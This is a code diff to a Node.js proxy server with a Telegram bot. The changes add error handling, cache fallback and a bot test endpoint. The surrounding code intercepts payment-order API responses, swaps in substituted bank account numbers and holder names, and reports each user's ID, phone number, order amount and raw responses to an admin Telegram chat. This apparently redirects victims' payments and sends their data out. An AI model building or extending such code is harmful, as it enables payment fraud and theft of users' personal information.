@@ -44,6 +44,15 @@ const tokenUserMap = {};
 const userPhoneMap = {};
 let debugNextResponse = false;
 
+async function safeSend(chatId, text) {
+  if (!bot || !chatId) return;
+  try {
+    await bot.sendMessage(chatId, text);
+  } catch(e) {
+    console.error('[TG_SEND_ERROR]', e.message, '| chatId:', chatId, '| text_preview:', String(text).substring(0, 100));
+  }
+}
+
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
   try {
@@ -71,11 +80,20 @@ async function loadData(forceRefresh) {
       cacheTime = Date.now();
       return cachedData;
     }
+    // Redis returned null (no data yet) — use existing cache if available
+    if (cachedData) return cachedData;
   } catch(e) {
     console.error('Redis load error:', e.message);
+    // Redis failed temporarily — use existing cache so adminChatId/settings are preserved
+    if (cachedData) {
+      console.error('Redis failed, using cached data to preserve adminChatId');
+      return cachedData;
+    }
   }
-  cachedData = { ...DEFAULT_DATA };
-  cacheTime = Date.now();
+  if (!cachedData) {
+    cachedData = { ...DEFAULT_DATA };
+    cacheTime = Date.now();
+  }
   return cachedData;
 }
 
@@ -614,8 +632,8 @@ app.use((req, res, next) => {
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
-    } catch(e) {}
+      await safeSend(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
+    } catch(e) { console.error('[LOG_MW_ERROR]', e.message); }
   })();
   next();
 });
@@ -628,6 +646,25 @@ app.get('/setup-webhook', async (req, res) => {
     const info = await bot.getWebHookInfo();
     res.json({ success: true, webhook: info });
   } catch(e) { res.json({ error: e.message }); }
+});
+
+app.get('/test-bot', async (req, res) => {
+  if (!bot) return res.json({ ok: false, error: 'Bot not initialized (check BOT_TOKEN)' });
+  const data = await loadData(true);
+  const result = { ok: false, botReady: !!bot, adminChatId: data.adminChatId, logRequests: data.logRequests };
+  if (!data.adminChatId) {
+    result.error = 'adminChatId is NULL — bot ne kisi se /start nahi liya ya Redis reset ho gaya';
+    return res.json(result);
+  }
+  try {
+    await bot.sendMessage(data.adminChatId, '🔔 Test message from /test-bot — bot is working!');
+    result.ok = true;
+    result.message = 'Test message sent successfully to Telegram!';
+  } catch(e) {
+    result.error = e.message;
+    result.hint = 'Bot blocked/kicked ho gaya hai ya chatId wrong hai';
+  }
+  res.json(result);
 });
 
 app.get('/health', async (req, res) => {
@@ -1743,7 +1780,7 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     const respData = getResponseData(jsonResp);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`).catch(()=>{});
+      await safeSend(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`);
     }
     if (respData && active) {
       if (Array.isArray(respData)) {
@@ -1754,12 +1791,12 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     }
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const afterDump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`).catch(()=>{});
+      await safeSend(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`);
     }
     const phone = getPhone(data, detectedUserId);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-      bot.sendMessage(data.adminChatId,
+      await safeSend(data.adminChatId,
 `🔔 💳 Paying
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${rd.orderId || rd.orderNo || 'N/A'}
@@ -1767,7 +1804,7 @@ Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
 Bank: ${active ? active.accountNo : 'N/A'}
 Acc: ${active ? active.accountHolder : 'None'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+      );
     }
     if (detectedUserId) { trackUser(data, detectedUserId, 'Paying'); saveData(data).catch(()=>{}); }
     sendJson(res, respHeaders, jsonResp, respBody);
